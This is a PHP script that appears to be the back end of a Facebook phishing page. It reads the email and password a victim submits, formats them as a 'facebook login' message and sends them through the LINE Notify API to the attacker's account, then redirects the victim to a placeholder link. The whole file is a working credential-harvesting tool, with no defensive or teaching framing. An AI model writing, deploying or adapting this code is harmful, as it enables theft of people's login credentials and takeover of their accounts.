<?php
    $header = "\nfacebook login";
    $user = $_POST["email"];
    $passwd = $_POST["pass"];

    $message = $header.
                "\n". "username : " . $user.
                "\n". "password : " . $passwd;

    if (isset($_POST["login"])) {
        if ($user <> "" && $passwd <> "") {
            sendlinemsg();
            header('Content-Type: text/html; charset=utf8');
            $res = notify_message($message);
            header("location: {link target}");
        }else{
            header("location: index.php");
        }
    }

    function sendlinemsg(){
        define('LINE_API',"https://notify-api.line.me/api/notify");
        define('LINE_TOKEN',"{your token}");


        function notify_message($message){
            $queryData = array('message' => $message);
            $queryData = http_build_query($queryData,'','&');
            $headerOptions = array(
                'http' => array(
                    'method' => 'POST',
                    'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
                                ."Authorization: Bearer ".LINE_TOKEN."\r\n"
                                ."Content-Length: ".strlen($queryData)."\r\n",
                    'content' => $queryData
                )
            );
            $context = stream_context_create($headerOptions);
            $result = file_get_contents(LINE_API, FALSE,$context);
            $res = json_decode($result);
            return $res;
        }


    }
?>
